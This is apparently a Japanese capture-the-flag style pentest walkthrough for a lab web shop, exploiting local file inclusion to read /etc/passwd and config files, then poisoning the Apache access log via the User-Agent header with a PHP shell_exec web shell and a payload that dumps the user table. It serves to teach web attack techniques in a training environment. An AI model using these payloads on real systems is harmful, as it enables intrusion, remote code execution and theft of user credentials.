---
created: 2026-01-08 19:00
modified: 2026-02-20 16:15
environment: [Server/Web]
vulnearability: [LFI]
type: pentest-walkthrough
pentest_category: Web
platform: [PurpleFlair]
tools: [Burp]
cve: []
tags: Log
---

# [Pentest-Walkthrough] Web - Project: LFI攻撃検証

セキュリティアナリストから、自社サービスのユーザ情報が漏洩している可能性があると報告されました。ユーザ情報は、Webアプリケーションが稼働しているサーバ内に保存されています。これらをふまえて、利用者の情報から攻撃を受けた可能性のあるサービスを停止しました。調査を進めるなかで、同僚がローカルファイルインクルージョン(LFI)脆弱性が存在すると指摘しました。

そこで、あなたは脆弱性を利用して、テストアカウントから他ユーザのパスワードが取得できることを確認することになりました。

alessandroのパスワードを取得して回答してください。

HP内の探索

`http://10.234.132.55/index.php?file=../../.././etc/passwd`

```
        </form>

        <div class="my-5">
        <a class="btn btn-outline-primary" href="./index.php?file=./pages/contact.php">contact</a>
            root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
Debian-exim:x:100:102::/var/spool/exim4:/usr/sbin/nologin
        </div>

    </div>
    <footer class="mt-5 footer bg-secondary">
    <div class="container text-center">
        <p>コーヒー豆 専門店</p>
        <a class="link-dark" href="#">トップに戻る</a>
```

ログポイズニング

/var/log/apache2/access.logが見れるか

```
    </table>
            <input class="btn btn-outline-dark" type="submit" name="update" value="カートへ">
        </form>

        <div class="my-5">
        <a class="btn btn-outline-primary" href="./index.php?file=./pages/contact.php">contact</a>
            10.234.132.126 - - [08/Jan/2026:19:44:21 +0900] "GET /index.php?file=../../../var/log/ HTTP/1.1" 200 2644 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.234.132.126 - - [08/Jan/2026:19:44:58 +0900] "GET /mypage.php HTTP/1.1" 200 1306 "http://10.234.132.55/index.php?file=../../../etc/passwd" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.234.132.126 - - [08/Jan/2026:19:45:17 +0900] "GET /index.php?file=mypage.php HTTP/1.1" 200 2740 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.234.132.126 - - [08/Jan/2026:19:55:35 +0900] "GET /index.php?file=var/www/html/functions/session.php HTTP/1.1" 200 2655 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
10.234.132.126 - - [08/Jan/2026:19:55:42 +0900] "GET /index.php?file=php://filter/convert.base64-encode/resource=config.php HTTP/1.1" 200 2667 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        </div>

    </div>
    <footer class="mt-5 footer bg-secondary">
    <div class="container text-center">
```

Burpを使用してパラメータを変え、User-Ajentの値にPHPのRCEコードを仕込む

ファイルを探索し、/var/www/html/functions/connect.phpにDBのログイン情報を発見

```
<?php
define('DB_HOST', 'mysql');
define('DB_USER', 'root');
define('DB_PASSWORD', 'root');
define('DB_NAME', 'ec');

$dsn = 'mysql:host=' . DB_HOST . '; dbname=' . DB_NAME . ';';

try {
    $pdo = new PDO($dsn, DB_USER, DB_PASSWORD);
} catch (PDOException $e) {
    exit('db connect faild: ' . $e->getMessage());
}
?>
```

```
<?php
session_start();

if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
    header('Location: ../login.php');
    exit;
}
?>

<?php require_once('./functions/connect.php'); ?>
<?php require('./functions/auth.php'); ?>

<!DOCTYPE html>
<html lang="ja">
<?
$title = 'ログイン';
require('./pages/meta.php');
?>

<body>
    <? require('./pages/header.php'); ?>
    <div class="container w-50">
        <div class="mt-3 mb-1">
            <h1>ログイン</h1>
        </div>
        <?php
        if (!empty($e_message)) {
            foreach ($e_message as $message) {
                echo '<p>' . $message . '</p>';
            }
        }
        ?>
        <form method="post">
            <label class="form-label">ユーザー名</label>
            <input class="form-control" type="text" name="name">
            <label class="form-label">パスワード</label>
            <input class="form-control" type="password" name="pass">
            <button type="submit" class="btn btn-outline-dark mt-3" name="login">ログイン</button>
        </form>

    </div>

    <? require('./pages/footer.php'); ?>
</body>

</html>
```

```
<?php
session_start();

$e_message = array();
if (isset($_POST['login'])) {
    if (empty($_POST['name'])) {
        $e_message['name'] = 'ユーザ名が入力されていません。';
    }
    if (empty($_POST['pass'])) {
        $e_message['pass'] = 'パスワードが入力されていません。';
    }

    if (empty($e_message)) {
        $sql = <<<EOM
        SELECT * FROM user
        WHERE name = :name;
        EOM;
        $stmt = $pdo->prepare($sql);
        $stmt->bindValue(':name', $_POST['name'], PDO::PARAM_STR);
        $res = $stmt->execute();

        if ($res = $stmt->fetch(PDO::FETCH_ASSOC)) {
            if (strcmp($_POST['pass'], $res['pass']) == 0) {
                $_SESSION['login'] = true;
                $_SESSION['name'] = $res['name'];
                $_SESSION['email'] = $res['email'];
                $_SESSION['id'] = $res['id'];
                header('Location: ../index.php');
            } else {
                $e_message['login'] = 'ユーザ名またはパスワードが間違っています。';
            }
        } else {
            $e_message['login'] = 'ユーザ名またはパスワードが間違っています。';
        }
    }
}

?>
```

User-Agentに

```
<?php $res=shell_exec($_GET['c']);var_dump(htmlspecialchars($res)) ?>
```

を設定することで、次にアクセスログを参照した際にこの文字列をPHPコードとして解釈させ、GETクエリcの値をshell_exec()の引数に与えて実行させることができます。そして、シェルでコマンドを実行した結果を`var_dump(htmlspecialchars($res))`で出力します。

編集したリクエストを送信したあとに、再びfileを../../../../../../../../var/log/apache2/access.logとし、新たに値cをls%20-laと設定したうえでindex.phpにアクセスします。

出力された文字列にファイルやディレクトリの一覧が含まれているので、サーバサイドでの任意コードの実行ができました。

パスワードの取得

次に、任意コードの実行を利用してalessandroのパスワードを取得します。 ファイル一覧にlogin.phpが含まれてたのでcをcat%20login.phpとして、ファイルの内容を読み出します。

```
<?php require_once('./functions/connect.php'); ?> <?php require('./functions/auth.php'); ?>
```

とあるため、さらにこれらのファイルの内容を確認します。

functions/connect.phpをcatすると以下のように出力されます。

出力内容の次の記述に着目します。

```
define('DB_HOST', 'mysql');
define('DB_USER', 'root');
define('DB_PASSWORD', 'root');
define('DB_NAME', 'ec');

$dsn = 'mysql:host=' . DB_HOST . '; dbname=' . DB_NAME . ';';

try {
    $pdo = new PDO($dsn, DB_USER, DB_PASSWORD);
pdoを用いてデータベースにアクセスしていることがわかります。

同様にfunctions/auth.phpをcatして得られる出力のうち、以下の記述に注目します。

$sql = <<<EOM
SELECT * FROM user
WHERE name = :name;
EOM;
$stmt = $pdo->prepare($sql);
$stmt->bindValue(':name', $_POST['name'], PDO::PARAM_STR);
$res = $stmt->execute();

if ($res = $stmt->fetch(PDO::FETCH_ASSOC)) {
    if (strcmp($_POST['pass'], $res['pass']) == 0) {
```

userテーブルが存在し、pass列にパスワードが格納されていることが推定できます。

以上から、新たにUser-Agentに以下のスクリプトを設定し、アクセスログを参照することで実行します。

```
<? require_once('./functions/connect.php');$result=$pdo->query('SELECT * FROM user')->fetchAll();print_r($result); ?>
```

このスクリプトは最初にfunctions/connect.phpを読み込みpdoを用意します。次にpdoを用いてuserテーブルに存在するすべてのレコードを取得します。最後に、print_r($result)として取得したデータを表示します。

実行すると以下のようになります。